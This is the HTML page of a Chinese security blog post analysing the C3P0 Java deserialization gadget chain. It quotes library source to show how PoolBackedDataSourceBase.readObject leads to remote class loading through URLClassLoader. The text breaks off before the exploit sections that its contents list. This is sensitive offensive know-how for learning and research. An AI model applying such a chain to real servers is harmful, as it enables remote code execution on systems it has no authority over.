@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="C3P0 链 C3P0 组件介绍 C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。  JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。 使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C3P0链">
+<meta property="og:url" content="http://curlysean.github.io/2025/04/01/C3P0%E9%93%BE/index.html">
+<meta property="og:site_name" content="肖恩的博客">
+<meta property="og:description" content="C3P0 链 C3P0 组件介绍 C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。  JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。 使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002523391-69c2f220-334e-4631-98b5-19d8bf07131f.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002611257-ed1c6bdb-e7d2-4449-9149-919b5ed4f7dd.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741003226032-ecc5c3ba-6a73-47af-84d8-98fac13b7722.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741089858903-68f3d419-1a47-491b-a13f-f8cf9d452d2e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741090441099-d6b12de5-ac36-4f5b-a6be-c84d9eb2b54b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741684878895-1c6fa6c9-edc7-4365-a2f6-6a0ab3cf37a1.png">
+<meta property="article:published_time" content="2025-04-01T13:54:32.139Z">
+<meta property="article:modified_time" content="2025-04-01T13:54:46.099Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="C3P0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002523391-69c2f220-334e-4631-98b5-19d8bf07131f.png">
+
+
+<link rel="canonical" href="http://curlysean.github.io/2025/04/01/C3P0%E9%93%BE/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/04/01/C3P0%E9%93%BE/","path":"2025/04/01/C3P0链/","title":"C3P0链"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>C3P0链 | 肖恩的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">肖恩的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-C3P0-%E9%93%BE%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">C3P0 链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SFzpI"><span class="nav-number">1.1.</span> <span class="nav-text">C3P0 组件介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#suq0L"><span class="nav-number">1.2.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#z1mJb"><span class="nav-number">1.3.</span> <span class="nav-text">Gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AiWuP"><span class="nav-number">1.3.1.</span> <span class="nav-text">URLClassLoader攻击链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DmQbC"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#LidAt"><span class="nav-number">1.3.1.1.1.</span> <span class="nav-text">链子尾部利用点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ixJNC"><span class="nav-number">1.3.1.1.2.</span> <span class="nav-text">调用referenceToObject</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sbk9p"><span class="nav-number">1.3.1.1.3.</span> <span class="nav-text">调用getObject</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WJ1UW"><span class="nav-number">1.3.1.1.4.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Fi5t9"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">实现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#HuFaA"><span class="nav-number">1.3.1.2.1.</span> <span class="nav-text">后续调整</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#j8FVX"><span class="nav-number">1.3.1.2.2.</span> <span class="nav-text">最终EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NP8OE"><span class="nav-number">1.3.2.</span> <span class="nav-text">JNDI注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ly7DN"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#aWW6J"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">JNDI注入流程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#fewO8"><span class="nav-number">1.3.2.2.1.</span> <span class="nav-text">JNDI触发点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#KDvsh"><span class="nav-number">1.3.2.2.2.</span> <span class="nav-text">调用dereference</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#zxcJe"><span class="nav-number">1.3.2.2.3.</span> <span class="nav-text">调用inner</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nNIfX"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">JNDIEXP构造</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mv7yR"><span class="nav-number">1.3.3.</span> <span class="nav-text">hexbase攻击链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XY97U"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#p2yPj"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">EXP实现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#g2Rbe"><span class="nav-number">1.4.</span> <span class="nav-text">不出网情况下</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rfzl8"><span class="nav-number">1.4.1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Xg8vt"><span class="nav-number">1.4.2.</span> <span class="nav-text">EXP实现</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/04/01/C3P0%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Sean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="C3P0链 | 肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          C3P0链
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-04-01 21:54:32 / 修改时间：21:54:46" itemprop="dateCreated datePublished" datetime="2025-04-01T21:54:32+08:00">2025-04-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="Java-反序列化之-C3P0-链学习">C3P0 链</h1>
+<h2 id="SFzpI">C3P0 组件介绍</h2>
+C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。
+
+<p>JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。</p>
+<p>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。</p>
+<p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p>
+<h2 id="suq0L">环境配置</h2>
+
+<ul>
+<li>JDK 8u65</li>
+<li>C3P0 <font style="color:#080808;background-color:#ffffff;">0.9.5.2</font></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="z1mJb">Gadget</h2>
+<h3 id="AiWuP">URLClassLoader攻击链</h3>
+<h4 id="DmQbC">分析</h4>
+<h5 id="LidAt">链子尾部利用点</h5>
+我们找到的类是`ReferenceableUtils`，它的`referenceToObject`方法，该方法中调用了`URLClassLoader`加载类的方法，后面也执行了`newInstance`进行的类的实例化
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">referenceToObject</span><span class="params">( Reference ref, Name name, Context nameCtx, Hashtable env)</span></span><br><span class="line">	<span class="keyword">throws</span> NamingException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">fClassName</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">		<span class="type">String</span> <span class="variable">fClassLocation</span> <span class="operator">=</span> ref.getFactoryClassLocation();</span><br><span class="line"></span><br><span class="line">		<span class="type">ClassLoader</span> <span class="variable">defaultClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">		<span class="keyword">if</span> ( defaultClassLoader == <span class="literal">null</span> ) defaultClassLoader = ReferenceableUtils.class.getClassLoader();</span><br><span class="line">		</span><br><span class="line">		ClassLoader cl;</span><br><span class="line">		<span class="keyword">if</span> ( fClassLocation == <span class="literal">null</span> )</span><br><span class="line">		    cl = defaultClassLoader;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    &#123;</span><br><span class="line">			<span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>( fClassLocation );</span><br><span class="line">			cl = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>( <span class="keyword">new</span> <span class="title class_">URL</span>[] &#123; u &#125;, defaultClassLoader );</span><br><span class="line">		    &#125;</span><br><span class="line">		</span><br><span class="line">		<span class="type">Class</span> <span class="variable">fClass</span> <span class="operator">=</span> Class.forName( fClassName, <span class="literal">true</span>, cl );</span><br><span class="line">		<span class="type">ObjectFactory</span> <span class="variable">of</span> <span class="operator">=</span> (ObjectFactory) fClass.newInstance();</span><br><span class="line">		<span class="keyword">return</span> of.getObjectInstance( ref, name, nameCtx, env );</span><br><span class="line">	    &#125;......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="ixJNC">调用referenceToObject</h5>
+
+<p>接下来我们要去看，在哪里调用了<code>ReferenceableUtils#referenceToObject</code></p>
+<p><code>ReferenceIndirector</code><font style="color:rgb(80, 80, 92);"> 的</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;getObject&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">方法调用了前者</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002523391-69c2f220-334e-4631-98b5-19d8bf07131f.png"></p>
+<h5 id="sbk9p">调用<font style="color:rgb(80, 80, 92);">getObject</font></h5>
+
+<p>继续向上找，在<code>PoolBackedDataSourceBase</code>的<code>readObject</code>方法中，调用了这里</p>
+<p>且这个方法是一个类的<code>readObject</code>方法，是一个入口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002611257-ed1c6bdb-e7d2-4449-9149-919b5ed4f7dd.png"></p>
+<h5 id="WJ1UW">小结</h5>
+其实这条链子非常短，也就简单的两次调用；难的是理解和调整
+
+<p>流程如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741003226032-ecc5c3ba-6a73-47af-84d8-98fac13b7722.png"></p>
+<h4 id="Fi5t9">实现</h4>
+根据上述分析的流程，其实逻辑走下来就下面的一句话
+
+<p>但是想要达到我们的目的，还是差一点距离</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="HuFaA">后续调整</h5>
+
+<p>我们来看入口类的<code>readObject</code>方法</p>
+<p>我们可以看到，如果想走到<code>getObject</code>处，需要我们反序列化后的类，是一个<code>IndirectlySerialized</code>类或者继承于这个类</p>
+<p>且在执行完这行代码后，执行了<code>this.connectionPoolDataSource = (ConnectionPoolDataSource) o;</code>，这里将我们传入的类，强转成了<code>ConnectionPoolDataSource</code>，并赋值给connectionPoolDataSource</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream ois )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> ois.readShort();</span><br><span class="line">		<span class="keyword">switch</span> (version)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> VERSION:</span><br><span class="line">				<span class="comment">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">					<span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line">					<span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource) o;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">this</span>.dataSourceName = (String) ois.readObject();</span><br><span class="line">				<span class="comment">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">					<span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line">					<span class="built_in">this</span>.extensions = (Map) o;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">this</span>.factoryClassLocation = (String) ois.readObject();</span><br><span class="line">				<span class="built_in">this</span>.identityToken = (String) ois.readObject();</span><br><span class="line">				<span class="built_in">this</span>.numHelperThreads = ois.readInt();</span><br><span class="line">				<span class="built_in">this</span>.pcs = <span class="keyword">new</span> <span class="title class_">PropertyChangeSupport</span>( <span class="built_in">this</span> );</span><br><span class="line">				<span class="built_in">this</span>.vcs = <span class="keyword">new</span> <span class="title class_">VetoableChangeSupport</span>( <span class="built_in">this</span> );</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unsupported Serialized Version: &quot;</span> + version);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是不是感觉这里要求我们反序列化后的类为<code>IndirectlySerialized</code>是不可能的，我们看一下<code>PoolBackedDataSourceBase</code>的<code>writeObject</code>方法，三步之内必有解药</p>
+<p>该方法内，有着一处<code>indirector.indirectForm( connectionPoolDataSource )</code>，而从上述代码中可以看到，indirector是一个<code>ReferenceIndirector</code>类，等价于<code>ReferenceIndirector.indirectForm(connectionPoolDataSource)</code></p>
+<p>且我们的connectionPoolDataSource不应继承序列化接口，在尝试序列化接口时失败，才能走入catch中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">( ObjectOutputStream oos )</span> <span class="keyword">throws</span> IOException</span><br><span class="line">	&#123;</span><br><span class="line">		oos.writeShort( VERSION );</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//test serialize</span></span><br><span class="line">			SerializableUtils.toByteArray(connectionPoolDataSource);</span><br><span class="line">			oos.writeObject( connectionPoolDataSource );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (NotSerializableException nse)</span><br><span class="line">		&#123;</span><br><span class="line">			com.mchange.v2.log.MLog.getLogger( <span class="built_in">this</span>.getClass() ).log(com.mchange.v2.log.MLevel.FINE, <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, nse);</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">Indirector</span> <span class="variable">indirector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.mchange.v2.naming.ReferenceIndirector();</span><br><span class="line">				oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) );</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (IOException indirectionIOException)</span><br><span class="line">			&#123; <span class="keyword">throw</span> indirectionIOException; &#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception indirectionOtherException)</span><br><span class="line">			&#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Problem indirectly serializing connectionPoolDataSource: &quot;</span> + indirectionOtherException.toString() ); &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		oos.writeObject( dataSourceName );</span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>indirectForm</code>，从传入对象中获取一个<code>Reference</code>对象，封装到一个<code>ReferenceSerialized</code>类中，而我们可以看到，<code>ReferenceSerialized</code>是继承了<code>IndirectlySerialized</code>接口的，就能成功走到<code>if (o instanceof IndirectlySerialized)</code>之中了</p>
+<p>看一下<code>IndirectlySerialized</code>，是一个内部类，发现他是继承了serialize接口的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">( Object orig )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> ((Referenceable) orig).getReference();</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReferenceSerialized</span> <span class="keyword">implements</span> <span class="title class_">IndirectlySerialized</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IndirectlySerialized</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span 